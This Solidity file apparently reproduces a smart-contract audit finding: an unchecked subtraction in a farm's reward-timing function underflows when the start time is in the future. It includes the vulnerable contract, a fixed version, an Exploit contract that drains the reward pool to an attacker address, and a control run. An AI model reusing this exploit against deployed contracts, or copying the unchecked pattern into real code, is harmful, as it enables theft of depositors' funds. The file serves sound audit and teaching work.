// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// =============================================================================
// Synthetic reproduction of AuditVault finding 59249
// "Underflow in Farm._getRewardAccrualTimeElapsed()" (Sperax - Farms, Quantstamp)
//
// ROOT CAUSE: at setup the Farm stores a FUTURE farmStartTime into
// `lastFundUpdateTime`. `_getRewardAccrualTimeElapsed()` computes
// `block.timestamp - lastFundUpdateTime` inside an `unchecked` block. When the
// current time is before the configured start, this underflows to ~2^256-1.
// `_getAccRewards()` then caps the accrual at the whole reward-token balance and
// credits it to the sole depositor, who claims and drains the reward pool.
//
// Everything below tokens/manager is a faithful MINIMAL double. The vulnerable
// function(s) are inlined VERBATIM and marked with `// @>`.
// =============================================================================

/// @notice Faithful minimal ERC20 double (reward token and deposit token).
contract MiniToken {
    string public name = "Mini";
    string public symbol = "MINI";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allowance");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

/// @notice Vulnerable Farm double. MasterChef-style per-share reward accounting.
contract Farm {
    uint256 internal constant PRECISION = 1e18;

    MiniToken public immutable rewardToken;
    MiniToken public immutable farmToken;

    uint256 public rewardRate; // reward tokens accrued per second (per share pool)
    uint256 public lastFundUpdateTime; // meant to track last update; set to farmStartTime at setup
    uint256 public accRewardPerShare; // scaled by PRECISION
    uint256 public totalLiquidity;

    mapping(address => uint256) public userLiquidity;
    mapping(address => uint256) public userRewardDebt;

    constructor(MiniToken _rewardToken, MiniToken _farmToken) {
        rewardToken = _rewardToken;
        farmToken = _farmToken;
    }

    /// @notice Setup stores the (possibly future) start time into lastFundUpdateTime.
    function setupFarm(uint256 _farmStartTime, uint256 _rewardRate) external {
        lastFundUpdateTime = _farmStartTime;
        rewardRate = _rewardRate;
    }

    // ----- VERBATIM VULNERABLE FUNCTION (finding 59249) -----------------------
    function _getRewardAccrualTimeElapsed() internal view returns (uint256) {
        unchecked {
            return block.timestamp - lastFundUpdateTime; // @> underflows when lastFundUpdateTime is a FUTURE start time
        }
    }
    // --------------------------------------------------------------------------

    /// @notice Accrued rewards for `_time`, capped at the reward-token balance held.
    function _getAccRewards(uint256 _time) internal view returns (uint256) {
        uint256 rwdSupply = rewardToken.balanceOf(address(this));
        uint256 accRewards = _time * rewardRate;
        if (accRewards > rwdSupply) {
            accRewards = rwdSupply; // huge underflowed time => entire balance is allocated
        }
        return accRewards;
    }

    function _updateFarmRewardData() internal {
        uint256 time = _getRewardAccrualTimeElapsed();
        if (totalLiquidity > 0) {
            uint256 accRewards = _getAccRewards(time);
            accRewardPerShare += (accRewards * PRECISION) / totalLiquidity;
        }
        lastFundUpdateTime = block.timestamp;
    }

    function deposit(uint256 amount) external {
        farmToken.transferFrom(msg.sender, address(this), amount);
        // Establish liquidity, snapshot debt at the current (pre-update) per-share value.
        totalLiquidity += amount;
        userLiquidity[msg.sender] += amount;
        userRewardDebt[msg.sender] = (userLiquidity[msg.sender] * accRewardPerShare) / PRECISION;
        // Underflowed elapsed time inflates accRewardPerShare for the sole depositor.
        _updateFarmRewardData();
    }

    function claim() external returns (uint256 pending) {
        _updateFarmRewardData();
        uint256 acc = (userLiquidity[msg.sender] * accRewardPerShare) / PRECISION;
        pending = acc - userRewardDebt[msg.sender];
        userRewardDebt[msg.sender] = acc;
        rewardToken.transfer(msg.sender, pending);
    }
}

/// @notice Same Farm with the finding's mitigation applied to the accrual-time helper.
contract FarmFixed {
    uint256 internal constant PRECISION = 1e18;

    MiniToken public immutable rewardToken;
    MiniToken public immutable farmToken;

    uint256 public rewardRate;
    uint256 public lastFundUpdateTime;
    uint256 public accRewardPerShare;
    uint256 public totalLiquidity;

    mapping(address => uint256) public userLiquidity;
    mapping(address => uint256) public userRewardDebt;

    constructor(MiniToken _rewardToken, MiniToken _farmToken) {
        rewardToken = _rewardToken;
        farmToken = _farmToken;
    }

    function setupFarm(uint256 _farmStartTime, uint256 _rewardRate) external {
        lastFundUpdateTime = _farmStartTime;
        rewardRate = _rewardRate;
    }

    // FIX: return 0 when the start time is in the future (or unset) instead of underflowing.
    function _getRewardAccrualTimeElapsed() internal view returns (uint256) {
        if (lastFundUpdateTime == 0 || block.timestamp < lastFundUpdateTime) {
            return 0;
        }
        return block.timestamp - lastFundUpdateTime;
    }

    function _getAccRewards(uint256 _time) internal view returns (uint256) {
        uint256 rwdSupply = rewardToken.balanceOf(address(this));
        uint256 accRewards = _time * rewardRate;
        if (accRewards > rwdSupply) {
            accRewards = rwdSupply;
        }
        return accRewards;
    }

    function _updateFarmRewardData() internal {
        uint256 time = _getRewardAccrualTimeElapsed();
        if (totalLiquidity > 0) {
            uint256 accRewards = _getAccRewards(time);
            accRewardPerShare += (accRewards * PRECISION) / totalLiquidity;
        }
        lastFundUpdateTime = block.timestamp;
    }

    function deposit(uint256 amount) external {
        farmToken.transferFrom(msg.sender, address(this), amount);
        totalLiquidity += amount;
        userLiquidity[msg.sender] += amount;
        userRewardDebt[msg.sender] = (userLiquidity[msg.sender] * accRewardPerShare) / PRECISION;
        _updateFarmRewardData();
    }

    function claim() external returns (uint256 pending) {
        _updateFarmRewardData();
        uint256 acc = (userLiquidity[msg.sender] * accRewardPerShare) / PRECISION;
        pending = acc - userRewardDebt[msg.sender];
        userRewardDebt[msg.sender] = acc;
        rewardToken.transfer(msg.sender, pending);
    }
}

/// @notice Exploit against the vulnerable Farm. Drains the entire reward pool to ATTACKER.
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant REWARD_POOL = 1_000_000 ether;
    uint256 internal constant DEPOSIT_AMOUNT = 100 ether;

    MiniToken public reward;
    MiniToken public lp;
    Farm public farm;

    uint256 public stolen; // reward tokens claimed by the attacker
    uint256 public farmRewardAfter; // reward tokens left in the farm after the drain

    function run() external payable {
        // ---- create every helper up front, in fixed order ----
        reward = new MiniToken(); // nonce 1
        lp = new MiniToken(); // nonce 2
        farm = new Farm(reward, lp); // nonce 3

        // ---- preconditions from the finding ----
        reward.mint(address(farm), REWARD_POOL); // reward pool pre-funded
        lp.mint(address(this), DEPOSIT_AMOUNT); // attacker's deposit funds
        lp.approve(address(farm), type(uint256).max);

        // Farm start time is set 2 seconds in the FUTURE relative to now.
        farm.setupFarm(block.timestamp + 2, 1);

        // Single deposit while now < start: underflow allocates the whole pool to us.
        farm.deposit(DEPOSIT_AMOUNT);

        // Claim immediately, draining all reward tokens.
        stolen = farm.claim();
        farmRewardAfter = reward.balanceOf(address(farm));

        // Forward the stolen reward tokens to ATTACKER so its balance == the profit.
        reward.transfer(ATTACKER, reward.balanceOf(address(this)));
    }
}

/// @notice Control: same attack against the fixed Farm. No rewards can be stolen.
contract ExploitControl {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant REWARD_POOL = 1_000_000 ether;
    uint256 internal constant DEPOSIT_AMOUNT = 100 ether;

    MiniToken public reward;
    MiniToken public lp;
    FarmFixed public farm;

    uint256 public stolen;
    uint256 public farmRewardAfter;

    function run() external payable {
        reward = new MiniToken();
        lp = new MiniToken();
        farm = new FarmFixed(reward, lp);

        reward.mint(address(farm), REWARD_POOL);
        lp.mint(address(this), DEPOSIT_AMOUNT);
        lp.approve(address(farm), type(uint256).max);

        farm.setupFarm(block.timestamp + 2, 1);
        farm.deposit(DEPOSIT_AMOUNT);

        stolen = farm.claim();
        farmRewardAfter = reward.balanceOf(address(farm));

        reward.transfer(ATTACKER, reward.balanceOf(address(this)));
    }
}
